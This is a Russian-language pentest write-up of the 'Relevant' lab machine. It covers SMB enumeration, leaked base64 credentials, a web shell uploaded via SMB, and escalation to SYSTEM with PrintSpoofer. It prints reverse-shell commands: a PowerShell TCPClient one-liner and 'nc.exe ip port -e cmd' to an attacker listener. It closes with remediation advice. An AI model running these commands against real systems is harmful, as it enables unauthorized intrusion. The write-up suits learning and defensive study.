**Отчет о пентесте машины Relevant**

**Дата проведения:** 07.09.2026  
**Цель:** Получение полного доступа к системе (SYSTEM) на машине Relevant.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом проведено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **80/tcp** – HTTP (Microsoft IIS 10.0)
- **135/tcp** – MSRPC (Microsoft Windows RPC)
- **139/tcp** – NetBIOS-SSN
- **445/tcp** – SMB (Windows Server 2016 Standard Evaluation)
- **3389/tcp** – RDP (Microsoft Terminal Services)

**1.2. Анализ SMB-шары**  
С помощью утилиты `smbclient` выполнено подключение к шаре `nt4wrksv`:

```bash
smbclient //10.113.150.181/nt4wrksv -N
```

В шаре обнаружен файл `passwords.txt`, содержащий закодированные в Base64 учетные данные:

```
Qm9iIC0gIVBAJCRXMHJEITEyMw== (Bob - !P@$$W0rD!123)
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk (Bill - Juw4nnaM4n420696969!$$$)
```

Попытка подключения по RDP с найденными учетными данными не увенчалась успехом (NLA или неверный пароль).

**1.3. Анализ веб-сервера**  
На порту 80 размещена стандартная заглушка IIS. В ходе фаззинга директорий на дополнительно обнаруженном порту 49663 найден единственный путь:

```
/aspnet_client/ (Status: 301)
```

Директория оказалась пустой и не содержала полезной информации.

**1.4. Загрузка веб-шелла**  
Учитывая наличие доступной SMB-шары `nt4wrksv` и веб-сервера IIS, в шару загружен файл `webshell.aspx`. Файл стал доступен по адресу:

```
http://10.113.150.181:49663/nt4wrksv/webshell.aspx
```

Через веб-шелл выполнена команда для установки обратного PowerShell-соединения:

```powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('ip', port); ..."
```

Получена ограниченная оболочка от имени пользователя `iis apppool\defaultapppool`.


### 2. Эскалация привилегий

**2.1. Анализ привилегий текущего пользователя**  
В полученной оболочке выполнена команда:

```cmd
whoami /priv
```

Обнаружена критически важная привилегия:

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Эта привилегия позволяет процессу олицетворять (impersonate) клиента после аутентификации, что является известным вектором для эскалации привилегий на Windows.

**2.2. Эксплуатация через PrintSpoofer**  
Для повышения привилегий использована утилита **PrintSpoofer** (автор @itm4n). Данный инструмент эксплуатирует уязвимость в сервисе Print Spooler (CVE-2020-1048 / RpcImpersonateClient), которая позволяет получить токен SYSTEM.

**Принцип работы PrintSpoofer:**
1. Утилита подключается к сервису Print Spooler (spoolsv.exe), который работает с системными привилегиями.
2. Используя механизм RPC, она заставляет Spooler вызвать обратный вызов, используя контекст безопасности SYSTEM.
3. С помощью `RpcImpersonateClient` или `SetThreadToken` токен SYSTEM олицетворяется в текущем потоке.
4. Затем создается новый процесс с полученным токеном через `CreateProcessAsUser`, что даёт шелл с правами SYSTEM.

**2.3. Реализация атаки**  
В папку `C:\inetpub\wwwroot\nt4wrksv\` через веб-шелл загружены следующие файлы:
- `update.exe` (переименованный PrintSpoofer64.exe)
- `nc.exe` (Netcat для Windows)

Запущен локальный слушатель на Kali:

```bash
nc -nlvp 6666
```

В полученной оболочке выполнена команда:

```cmd
cmd /c C:\inetpub\wwwroot\nt4wrksv\update.exe -c "C:\inetpub\wwwroot\nt4wrksv\nc.exe ip port -e cmd"
```

После выполнения на порту 6666 получено обратное подключение. Проверка прав:

```cmd
whoami
nt authority\system
```

Подтверждено получение полных привилегий SYSTEM.


### 3. Итоговый вывод

В ходе пентеста машины Relevant были успешно реализованы следующие этапы:

1. **Разведка:** Сканирование портов, обнаружение SMB-шары `nt4wrksv` и веб-сервера IIS.
2. **Получение доступа:** Извлечение паролей из SMB-шары, загрузка веб-шелла через SMB, получение обратной оболочки через PowerShell.
3. **Эскалация до SYSTEM:** Использование привилегии `SeImpersonatePrivilege` и эксплуатация сервиса Print Spooler через утилиту PrintSpoofer для получения токена SYSTEM.

**Результат:** Полный контроль над системой достигнут. Компрометация учётной записи SYSTEM подтверждена.


### 4. Рекомендации по устранению уязвимостей

| Уязвимость | Рекомендация |
|------------|--------------|
| **Открытая SMB-шара `nt4wrksv`** | Ограничить доступ к шаре, настроить аутентификацию и удалить неиспользуемые общие ресурсы. |
| **Запись в веб-директорию через SMB** | Настроить права доступа к папке `inetpub` так, чтобы веб-контент не мог быть изменён через SMB. |
| **Использование `SeImpersonatePrivilege`** | Ограничить привилегии учетных записей IIS. Выполнить аудит привилегий и удалить `SeImpersonatePrivilege` для непривилегированных пользователей. |
| **Использование PrintSpoofer** | Отключить сервис Print Spooler на серверах, где он не требуется, или установить обновления безопасности (CVE-2020-1048). |
| **Наличие веб-шелла** | Внедрить механизмы обнаружения вредоносных файлов (WAF, антивирус, мониторинг файловых изменений). |
